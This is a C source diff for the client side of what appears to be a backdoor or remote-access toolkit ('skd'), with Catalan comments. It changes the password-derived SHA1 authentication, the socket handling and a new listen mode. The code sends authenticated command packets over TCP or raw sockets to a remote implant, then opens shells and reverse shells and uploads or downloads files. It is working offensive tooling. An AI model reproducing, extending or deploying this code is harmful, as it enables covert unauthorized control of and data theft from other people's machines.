@@ -16,11 +16,15 @@
 #include "raw.h"
 #include "config.h"
 #include "actions.h"
+#include "sha1.h"
 
 struct rawsock r;
 int swapd_pid, rawd_pid;
 int winchange = 1;
+unsigned char clientauth[20], serverauth[20];
+//rc4_ctx skd_crypt, skd_decrypt;
 
+// Per la redimesio de finestra
 void winch(int i) {
     signal(SIGWINCH, winch);
     winchange = 1;
@@ -110,7 +114,7 @@ int client_shell(int rsock, int wsock) {
 	return 0;
 }
 
-int client_upload(int rsock, int wsock, char *file) {
+int client_upload(int sock, char *file) {
     int fd, bytes;
     char buf[BUFSIZE];
     unsigned long size, transfered;
@@ -124,10 +128,10 @@ int client_upload(int rsock, int wsock, char *file) {
         transfered = 0;
         printf("Size: %lu bytes\n", size);
         while ((bytes = read(fd, &buf, BUFSIZE)) > 0) {
-            if ((transfered += write(wsock, &buf, bytes)) < bytes) {
+            if ((transfered += write(sock, &buf, bytes)) < bytes) {
                 printf("ERROR AL LLEGIR!\n");
             } else  {
-                printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bUploaded: %u%%", (transfered/(1+(size/100))));
+                printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bUploaded: %lu%%", (transfered/(1+(size/100))));
             }
         }
         printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bUploaded: 100%%\n");
@@ -137,7 +141,7 @@ int client_upload(int rsock, int wsock, char *file) {
     return 0;
 }
 
-int client_download(int rsock, int wsock, char *file) {
+int client_download(int sock, char *file) {
     int fd, bytes;
     char buf[BUFSIZE];
     char *ptr = strrchr(file, '/');
@@ -148,7 +152,7 @@ int client_download(int rsock, int wsock, char *file) {
         perror("open");
     } else {
         bytes = 0;
-        while ((bytes = read(rsock, &buf, BUFSIZE)) > 0) {
+        while ((bytes = read(sock, &buf, BUFSIZE)) > 0) {
             if (write(fd, &buf, bytes) < bytes) {
                 printf("ERROR AL LLEGIR!\n");
             }
@@ -159,31 +163,23 @@ int client_download(int rsock, int wsock, char *file) {
     return 0;
 }
 
-void do_action(int action, int rsock, int wsock, char *file) {
+void do_action(int action, int sock, char *file) {
     switch(action) {
         case UPLOAD:
+        case RUPLOAD:
             printf("Uploading file\n");
-            client_upload(rsock, wsock, file);
+            client_upload(sock, file);
             break;
         case DOWNLOAD:
+        case RDOWNLOAD:
             printf("Downloading file\n");
-            client_download(rsock, wsock, file);
+            client_download(sock, file);
             break;
         case SHELL:
-            printf("Launching shell (scape character is ^K) \n", rsock, wsock);
-            client_shell(rsock, wsock);
-            break;
-        case RUPLOAD:
-            printf("Reverse uploading file\n");
-            client_upload(rsock, wsock, file);
-            break;
-        case RDOWNLOAD:
-            printf("Reverse downloading file\n");
-            client_download(rsock, wsock, file);
-            break;
         case RSHELL:
-            printf("Launching reverse shell\n");
-            client_shell(rsock, wsock);
+        case LISTEN:
+            printf("Launching shell (scape character is ^K) \n");
+            client_shell(sock, sock);
             break;
         default:
             printf("Invalid option: %d\n", action);
@@ -247,7 +243,7 @@ void start_daemon(int action, int port, char *file) {
 
     printf("Received connection!\n");
 
-    do_action(action, sock_con, sock_con, file);
+    do_action(action, sock_con, file);
 
     exit(0);
 }
@@ -278,7 +274,7 @@ int raw_daemon() {
         // Si el tamany del paquet es el que toca
         if (size == sizeof(struct packet)) {
             // I el password és correcte
-            if (!memcmp(SERVERAUTH, p.action.pass, 20)) {
+            if (!memcmp(serverauth, p.action.pass, 20)) {
                 //printf("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", p.action.action);
                 //If has the RESET flag, is a direct raw packet
                 if (p.tcp.rst) {
@@ -287,6 +283,32 @@ int raw_daemon() {
                 }
             }
         }
+    }
+}
+
+void get_pass() {
+    struct termios old, new;
+    char p[64];
+    sha1_context sha;
+    sha1_starts(&sha);
+
+    tcgetattr(0, &old);
+    tcgetattr(0, &new);
+    new.c_lflag &= ~(ECHO);
+    new.c_lflag &= ~(ICANON | ECHO | ISIG );
+    new.c_iflag &= ~(IXON | IXOFF);
+    tcsetattr(0, TCSAFLUSH, &new);
+
+    printf("password: "); fflush(stdout);
+    fgets(p, 64, stdin); fflush(stdin);
+    p[strlen(p) - 1] = '\0';
+    tcsetattr(0, TCSAFLUSH, &old);
+
+    sha1((unsigned char *)p, strlen(p), clientauth);
+    printf("\n");
+    int i = 0;
+    for (i = 0; i < 20; i++) {
+        serverauth[i] = clientauth[i]^p[0];
     }
 }
 
@@ -336,7 +358,7 @@ int main(int argc, char *argv[]) {
     }
 
 	// Check the parameters dependences
-	if ((local_port > 65535) || (dest_port  > 65535) || (dest_port == -1) || 
+	if ((local_port > 65535) || (dest_port  > 65535) ||  
 		((action == SHELL)    && ((!host) || (dest_port == -1))) ||
 		((action == UPLOAD)   && ((!host) || (dest_port == -1)   || (!file))) ||
 		((action == DOWNLOAD) && ((!host) || (dest_port == -1)   || (!file))) ||
@@ -347,16 +369,10 @@ int main(int argc, char *argv[]) {
 			return usage(argv[0]);
 	}
 
-	// Check hostname
-	ip = resolve(host);
-	//ip = resolve(host, ipname);
-    if (ip == INADDR_NONE) {
-        perror("host");
-        return -1;
-    }
+    get_pass();
 
 	// Launch daemon if is a reverse command
-	if (reverse) {
+    if (reverse) {
         switch (action) {
             case UPLOAD: action = RUPLOAD; break;
             case DOWNLOAD: action = RDOWNLOAD; break;
@@ -368,35 +384,44 @@ int main(int argc, char *argv[]) {
         sleep(2);
 
         // TODO: retry several times 
+        if (action != LISTEN) {
+            // Connect to skd
+            int sock = socket(AF_INET, SOCK_STREAM, 0);
+            if (sock < 0) {
+                perror("socket");
+                return -1;
+            }
+	        // Check hostname
+	        ip = resolve(host);
+	        //ip = resolve(host, ipname);
+            if (ip == INADDR_NONE) {
+                perror("host");
+                return -1;
+            }
+    
+            memset(&cli, 0, sizeof(cli));
+            cli.sin_family = AF_INET;
+            cli.sin_port = htons(dest_port);
+            cli.sin_addr.s_addr = ip;
+            if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0 ) {
+                perror("connect");
+                return -1;
+            }
 
-        // Connect to skd
-        int sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0) {
-            perror("socket");
-            return -1;
-        }
-        memset(&cli, 0, sizeof(cli));
-        cli.sin_family = AF_INET;
-        cli.sin_port = htons(dest_port);
-        cli.sin_addr.s_addr = ip;
-        if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0 ) {
-            perror("connect");
-            return -1;
-        }
+            // Generate packet
+            memcpy(cmdpkt.pass, clientauth, 20);
+            cmdpkt.port = local_port;
+            cmdpkt.action = action;
+            memcpy(cmdpkt.bytes, file, strlen(file));
 
-        // Generate packet
-        memcpy(cmdpkt.pass, CLIENTAUTH, strlen(CLIENTAUTH));
-        cmdpkt.port = local_port;
-        cmdpkt.action = action;
-        memcpy(cmdpkt.bytes, file, strlen(file));
-
-        // Send packet
-        write(sock, &cmdpkt, sizeof(cmdpkt));
-        if (reverse) {
-            close(sock);
-        } else {
-            do_action(action, sock, sock, file);
-            close(sock);    
+            // Send packet
+            write(sock, &cmdpkt, sizeof(cmdpkt));
+            if (reverse) {
+                close(sock);
+            } else {
+                do_action(action, sock, file);
+                close(sock);    
+            }
         }
     } else if (raw) {
         if (!getuid()) {
@@ -404,10 +429,18 @@ int main(int argc, char *argv[]) {
             pipe(r.w);
             r.initialized = 1;
             rawd_pid = raw_daemon();
-            swapd_pid = swapd_raw(&r, ip, local_port, dest_port, CLIENTAUTH);
+	        // Check hostname
+	        ip = resolve(host);
+	        //ip = resolve(host, ipname);
+            if (ip == INADDR_NONE) {
+                perror("host");
+                return -1;
+            }
+    
+            swapd_pid = swapd_raw(&r, ip, local_port, dest_port, clientauth);
 
             // Generate packet
-            memcpy(cmdpkt.pass, CLIENTAUTH, strlen(CLIENTAUTH));
+            memcpy(cmdpkt.pass, clientauth, 20); 
             cmdpkt.port = local_port;
             cmdpkt.action = action;
             cmdpkt.size = 0;
